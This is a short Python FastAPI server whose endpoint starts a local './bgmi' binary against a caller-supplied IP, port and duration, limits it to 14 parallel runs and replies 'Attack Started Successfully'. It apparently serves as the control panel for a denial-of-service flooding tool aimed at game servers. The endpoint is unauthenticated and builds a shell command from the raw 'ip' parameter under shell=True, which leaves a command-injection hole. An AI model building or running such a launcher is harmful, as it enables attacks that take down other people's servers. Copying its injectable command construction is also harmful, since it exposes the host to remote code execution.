
from fastapi import FastAPI
import subprocess
import asyncio
import psutil

app = FastAPI()

@app.get("/run-command")
async def run_command(ip: str, port: int, time: int):
    command = f"./bgmi {ip} {port} {time} 200"

    # Check how many instances of the process are already running
    count = 0
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        if proc.info['name'] == 'bgmi' or (proc.info['cmdline'] and './bgmi' in proc.info['cmdline']):
            count += 1

    if count >= 14:
        return {"error": True, "output": "Maximum number of instances are already running"}

    try:
        # Run the command in the background
        process = subprocess.Popen(command, shell=True)

        # Create a background task to stop the process after the specified time
        asyncio.create_task(stop_process_after_time(process, time))
        return {"error": False, "output": "Attack Started Successfully", "ip": ip, "port": port, "time": time}
    except Exception as e:
        return {"error": True, "output": str(e)}

async def stop_process_after_time(process, time):
    await asyncio.sleep(time)
    process.terminate()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
